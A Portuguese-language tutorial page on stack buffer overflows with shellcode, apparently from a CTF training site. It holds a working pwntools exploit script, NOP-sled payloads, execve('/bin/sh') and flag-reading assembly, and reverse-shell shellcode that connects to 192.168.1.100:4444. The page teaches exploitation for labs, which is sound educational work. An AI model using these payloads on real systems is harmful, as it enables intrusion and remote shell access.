---
title: "Buffer Overflow - Shellcode"
sidebar_position: 3
---

Shellcode é código de máquina enviado como dado e executado pelo programa alvo. **O processador não distingue dados de instruções: se o `rip` apontar para uma página com permissão de execução, ele executa os bytes que estiverem lá**. O nome vem do uso mais comum, que é abrir uma shell.

O ataque consiste em colocar o shellcode no buffer e sobrescrever o endereço de retorno com o endereço do buffer.

**Pré-requisito**: a região onde o shellcode fica precisa ser **executável**. Na stack, isso significa [NX](../../protections.mdx#nx-no-execute-ou-dep-data-execution-prevention) desligado (`NX disabled` / `Stack: Executable` no `checksec`). Com NX ligado, shellcode é impossível e o caminho é fazer [ROP](../rop/index.mdx).

## Montando o ataque

<Mem
  title="Payload com shellcode no buffer"
  top="endereços baixos"
  bottom="endereços altos"
  rows={[
    {addr: 'buf', label: 'NOP sled (0x90 ...)', kind: 'neutral', h: 1.4, note: 'o return address aponta para cá'},
    {label: 'shellcode', kind: 'ctrl', h: 1.6},
    {label: 'padding', kind: 'neutral'},
    {addr: 'rbp+0x8', label: 'p64(buf + margem)', kind: 'danger', note: 'return address'},
  ]}
/>

1. Confirme o overflow e que a stack é executável.
2. Descubra o endereço do buffer. No GDB: `p $rsp`, `x/20gx $rsp` ou `search AAAA` (pwndbg). Com ASLR a stack muda a cada execução, então o endereço precisa ser vazado (em desafios introdutórios o programa costuma imprimi-lo).
3. Payload: `shellcode + padding até o return address + endereço do shellcode`.

```py
from pwn import *

context.binary = ELF('./program')     # define a arquitetura para asm() e shellcraft
p = process()

payload  = asm(shellcraft.sh())           # shellcode
payload  = payload.ljust(312, b'A')       # padding até o return address
payload += p32(0xffffcfb4)                # endereço do buffer

p.sendline(payload)
p.interactive()
```

### NOP sled

O endereço do buffer visto no GDB quase nunca é igual ao da execução normal: o GDB acrescenta variáveis de ambiente (`LINES`, `COLUMNS`) e o nome do programa muda, o que desloca a stack em algumas dezenas de bytes. 

Um *NOP sled* resolve isso: uma sequência de `nop` (`0x90`) antes do shellcode. Se o `rip` cair em qualquer ponto dela, a execução desliza até o shellcode.

:::note O que é NOP?
NOP é uma instrução que não faz nada. O `rip` simplesmente executa a próxima instrução. Se encadearmos vários NOPs, "deslizamos" sobre eles até o payload efetivo.
:::

```py
payload  = b'\x90' * 240                  # NOP sled (asm(shellcraft.nop()) em outras arquiteturas)
payload += asm(shellcraft.sh())
payload  = payload.ljust(312, b'A')
payload += p32(0xffffcfb4 + 120)          # mira no meio do sled
```

### Variações úteis

- **Buffer pequeno**: coloque o shellcode **depois** do endereço de retorno. Logo após o `ret`, `rsp` aponta exatamente para lá, então um gadget `jmp rsp` (ou `call rsp`) no lugar do endereço de retorno dispensa conhecer o endereço da stack.
- **Registrador apontando para o buffer**: muitas vezes `rax` ainda guarda o endereço do buffer no momento do `ret` (é o retorno de `gets`/`strcpy`). Um gadget `jmp rax` / `call rax` resolve.
- **Bytes proibidos**: se a leitura para em `\0`, `\n` ou espaço, o shellcode não pode conter esses bytes. `asm(shellcraft.sh())` não tem bytes nulos; para outros casos, `encode(shellcode, avoid=b'\n ')` gera uma versão equivalente sem os bytes indicados.
- **Stager**: um shellcode mínimo que faz `read(0, rsp, N)` e pula para o que leu. Útil quando há poucos bytes disponíveis.
- **Outras regiões**: o mesmo vale para heap, `.bss` ou regiões criadas com `mmap(..., PROT_EXEC, ...)`. Confira as permissões com `vmmap`.

## Syscalls

Shellcode normalmente fala direto com o kernel, sem depender de bibliotecas, através de [syscalls](../../../introduction/assembly/coding-assembly.mdx#syscalls).

| | x86-64 | x86 (32 bits) |
|---|---|---|
| Instrução | `syscall` | `int 0x80` |
| Número da syscall | `rax` | `eax` |
| Argumentos | `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9` | `ebx`, `ecx`, `edx`, `esi`, `edi`, `ebp` |
| Retorno | `rax` (negativo = erro) | `eax` |

Os registradores **não são os mesmos da convenção de chamada de funções**: o 4º argumento de uma syscall vai em `r10` (a instrução `syscall` destrói `rcx` e `r11`), e em 32 bits funções recebem argumentos pela stack enquanto syscalls usam registradores.

As mais usadas ([tabela completa](../../../extra/syscall-table.mdx)):

| Syscall | x86-64 | x86 | Assinatura |
|---|---|---|---|
| `read` | 0 | 3 | `read(fd, buf, count)` |
| `write` | 1 | 4 | `write(fd, buf, count)` |
| `open` | 2 | 5 | `open(path, flags, mode)` |
| `mprotect` | 10 | 125 | `mprotect(addr, len, prot)` |
| `rt_sigreturn` | 15 | 173 | usada em [SIGROP](../rop/sigrop.mdx) |
| `dup2` | 33 | 63 | `dup2(oldfd, newfd)` |
| `socket` | 41 | 359 | `socket(domain, type, protocol)` |
| `connect` | 42 | 362 | `connect(fd, addr, addrlen)` |
| `execve` | 59 | 11 | `execve(path, argv, envp)` |
| `exit` | 60 | 1 | `exit(status)` |
| `openat` | 257 | 295 | `openat(dirfd, path, flags, mode)` |

Em kernels anteriores ao 4.3, as operações de socket em 32 bits passam todas pela syscall `socketcall` (102). File descriptors padrão: `0` = stdin, `1` = stdout, `2` = stderr. Arquivos e sockets abertos recebem o menor número livre (normalmente a partir de 3).

### `execve("/bin/sh", NULL, NULL)`

```nasm
xor rsi, rsi                ; rsi = 0 (argv = NULL)
push rsi                    ; 8 bytes zerados na stack: o terminador da string
mov rdi, 0x68732f6e69622f2f ; "//bin/sh" em little endian (u64(b'//bin/sh'))
push rdi                    ; [rsp] = "//bin/sh\0"
mov rdi, rsp                ; rdi = ponteiro para a string
xor rdx, rdx                ; rdx = 0 (envp = NULL)
push 59
pop rax                     ; rax = 59 (execve)
syscall
```

- O `execve` recebe um **ponteiro** para o caminho, então a string é montada na stack e `rsp` vira o ponteiro. A barra dupla só completa 8 bytes; o kernel a ignora.
- O código não contém bytes nulos: `xor rsi, rsi` em vez de `mov rsi, 0` (`48 c7 c6 00 00 00 00`) e `push 59; pop rax` em vez de `mov rax, 59`. Isso importa quando o input passa por `strcpy` ou `scanf("%s")`. Se a leitura for por `read`, não é necessário.

### Leitura de arquivo (open, read, write)

Quando `execve` está bloqueado (seccomp) ou não há shell no servidor, lê-se a flag diretamente:

```nasm
; fd = open("flag.txt", O_RDONLY)
lea rdi, [rel path]     ; rel = relativo ao rip: funciona em qualquer endereço
xor esi, esi
mov eax, 2
syscall

; n = read(fd, rsp, 0x100)
mov edi, eax
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall

; write(1, rsp, n)
mov edx, eax
mov edi, 1
mov eax, 1
syscall

; exit(0), para a execução não continuar em cima dos dados abaixo
mov eax, 60
xor edi, edi
syscall

path: db 'flag.txt', 0
```

No pwntools: `shellcraft.cat('flag.txt')`.

### Reverse shell

Sequência: `socket` → `connect` → `dup2` do socket sobre 0, 1 e 2 → `execve`. O `dup2(sock, n)` faz o descritor `n` virar uma cópia do socket, então a shell passa a ler e escrever pela rede.

```nasm
; sock = socket(AF_INET, SOCK_STREAM, 0)
mov eax, 41
mov edi, 2
mov esi, 1
xor edx, edx
syscall
mov ebx, eax

; connect(sock, &addr, 16)
mov eax, 42
mov edi, ebx
lea rsi, [rel addr]
mov edx, 16
syscall

; dup2(sock, 0), dup2(sock, 1), dup2(sock, 2), e então o execve acima

addr:                     ; struct sockaddr_in (16 bytes)
    dw 2                  ; sin_family = AF_INET
    dw 0x5c11             ; sin_port = 4444 em big endian: bytes "11 5c"
    dd 0x6401a8c0         ; sin_addr = 192.168.1.100: bytes "c0 a8 01 64"
    times 8 db 0
```

Porta e IP ficam em *network byte order* (big endian). Como `dw`/`dd` gravam em little endian, os valores aparecem invertidos no código. Na prática: `shellcraft.connect('192.168.1.100', 4444) + shellcraft.dupsh()`.

## Escrevendo e testando um shellcode

Com o pwntools, o ciclo todo é:

```py
from pwn import *
context.arch = 'amd64'

sc = asm('''
    mov edi, 10
    mov eax, 60
    syscall
''')                              # exit(10)

print(sc.hex(), len(sc))
print(disasm(sc))                 # conferir as instruções e procurar bytes proibidos
p = run_shellcode(sc)             # executa em um processo separado
p.wait()
print(p.poll())                   # 10
```

Shellcodes prontos ficam em `shellcraft` (veja a [referência](../../../extra/shellcraft.mdx)). Eles devolvem **assembly em texto**, que precisa passar por `asm()`:

```py
shellcraft.sh()           # execve("/bin/sh")
shellcraft.cat('flag')    # open + read + write
shellcraft.dupsh(fd)      # dup2 para 0, 1, 2 e sh
shellcraft.echo('texto')
shellcraft.exit(0)
```

### Sem pwntools

O mesmo `exit(10)` em 32 bits, montado com `nasm`:

```nasm
; exit.asm
section .text
global _start
_start:
    mov eax, 1        ; syscall exit
    mov ebx, 10       ; status
    int 0x80
```

```bash
nasm -f elf32 exit.asm -o exit.o && ld -m elf_i386 exit.o -o exit
./exit; echo $?        # 10
objdump -d exit
```

```
08049000 <_start>:
 8049000:       b8 01 00 00 00          mov    $0x1,%eax
 8049005:       bb 0a 00 00 00          mov    $0xa,%ebx
 804900a:       cd 80                   int    $0x80
```

A coluna do meio são os bytes do shellcode. Para testá-los, um programa que copia os bytes para a stack e pula para eles:

```c
// gcc testador.c -o testador -z execstack -fno-stack-protector -m32
int main(void) {
    char shellcode[] = "\xb8\x01\x00\x00\x00\xbb\x0a\x00\x00\x00\xcd\x80";
    ((void (*)(void))shellcode)();
    return 0;
}
```

Ao compilar em C, a flag `-z execstack` desliga o NX e `-m32` compila em 32 bits (pode exigir `gcc-multilib`). Repare que esse shellcode está cheio de bytes nulos: funciona aqui, mas não passaria por um `strcpy`.

## Referências

- [Tabela de syscalls x86-64 (Filippo)](https://filippo.io/linux-syscall-table/)
- [Tabela de syscalls x86-64 (R. Chapman)](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [Tabela de syscalls x86 (IME-USP)](https://www.ime.usp.br/~kon/MAC211/syscalls.html)
